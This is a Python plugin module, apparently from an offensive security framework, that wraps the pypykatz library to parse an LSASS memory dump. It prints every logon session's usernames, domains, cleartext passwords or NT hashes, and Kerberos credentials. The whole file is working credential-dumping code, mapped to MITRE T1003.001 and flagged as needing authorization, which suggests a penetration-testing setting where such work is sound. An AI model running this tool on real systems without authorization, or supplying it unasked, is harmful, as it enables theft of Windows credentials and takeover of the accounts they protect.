"""pypykatz — Mimikatz in Python: LSASS/registry/DPAPI parsing offline."""
from __future__ import annotations
import sys
from typing import Any

MANIFEST = {
    "capability_id": "adxpl.credential.pypykatz.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["lsass_parse"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1003.001"],
}


def run(args: Any) -> int:
    dump_file = getattr(args, "dump_file", None)
    if not dump_file:
        print("[!] --dump-file required (LSASS minidump path)", file=sys.stderr)
        return 1

    try:
        from pypykatz.pypykatz import pypykatz
    except ImportError:
        print("[!] pypykatz not installed: pip install pypykatz", file=sys.stderr)
        return 1

    print("[*] pypykatz parsing: {}".format(dump_file))
    try:
        result = pypykatz.parse_minidump_file(dump_file)
        for luid, session in result.logon_sessions.items():
            for c in session.msv_creds + session.wdigest_creds + session.kerberos_creds:
                print("  {}\\{} : {} (type: {})".format(
                    getattr(c, "domainname", ""),
                    getattr(c, "username", ""),
                    getattr(c, "password", "") or getattr(c, "NThash", ""),
                    type(c).__name__))
        return 0
    except Exception as exc:
        print("[-] pypykatz error: {}".format(exc), file=sys.stderr)
        return 1
